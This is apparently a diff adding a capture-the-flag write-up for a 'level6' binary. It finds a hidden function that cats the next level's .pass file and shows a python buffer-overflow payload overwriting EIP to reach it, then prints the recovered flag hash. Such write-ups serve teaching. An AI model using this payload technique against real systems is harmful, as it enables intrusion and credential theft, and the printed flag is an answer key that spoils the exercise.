@@ -1,0 +1,37 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗          ██████╗ 
+██║     ██╔════╝██║   ██║██╔════╝██║         ██╔════╝ 
+██║     █████╗  ██║   ██║█████╗  ██║         ███████╗ 
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ██╔═══██╗
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ╚██████╔╝
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚═════╝ 
+
+
+strings level6
+-> /bin/cat /home/user/level7/.pass
+
+objdump -d level6
+
+There is a function <n> that is never called.
+This function is making a call to the <system> function.
+This call to the <system> function is probably the /bin/cat.
+
+./level6 hello
+-> Nope
+
+The program is taking a paramter.
+Let's use a basic Buffer Overflow exploit.
+
+First, get the offset with a pattern metasploit:
+-> 72
+
+Rewrite the EIP with the address of <n> function.
+
+python -c "print 'A' * 72 + '\x54\x84\x04\x08'" > /tmp/file
+
+./level6 `cat /tmp/file`
+
+|══════════════════════════════════════════════════════════════════|
+| f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d |
+|══════════════════════════════════════════════════════════════════|
+
